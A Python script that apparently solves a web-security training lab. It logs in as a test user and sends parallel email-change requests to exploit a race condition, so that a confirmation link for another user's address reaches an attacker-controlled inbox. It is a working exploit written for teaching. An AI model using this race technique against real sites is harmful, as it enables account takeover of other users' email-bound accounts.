import sys
import os
import threading
import re
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

# get the exploit server email client address
page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
exploit_link = soup.find("a", {"id": "exploit-link"})
exploit_url = exploit_link["href"] if exploit_link else None

# find our email address from the exploit server
if exploit_url:
    lab.info(f"Exploit server: {exploit_url}")

# get CSRF token for email change
csrf = soup.find("input", {"name": "csrf"})["value"]

# race two email change requests on the same endpoint:
# one to our email (so we receive the confirmation link)
# one to carlos@ginandjuice.shop (so the stored pending email is the admin one)
# the race window: server stores the email, then sends confirmation to the stored value
# if our request stores carlos's email but the other thread sends the link to us, we win
target_email = "carlos@ginandjuice.shop"
our_email = "attacker@exploit-server.net"

def change_email(email):
    lab.post("/my-account/change-email", data={"csrf": csrf, "email": email})

lab.info("Racing email change requests...")

for attempt in range(10):
    t1 = threading.Thread(target=change_email, args=(our_email,))
    t2 = threading.Thread(target=change_email, args=(target_email,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

lab.info("Check exploit server email client for confirmation link to carlos@ginandjuice.shop")
lab.warn("This lab requires manually clicking the confirmation link from the email client")
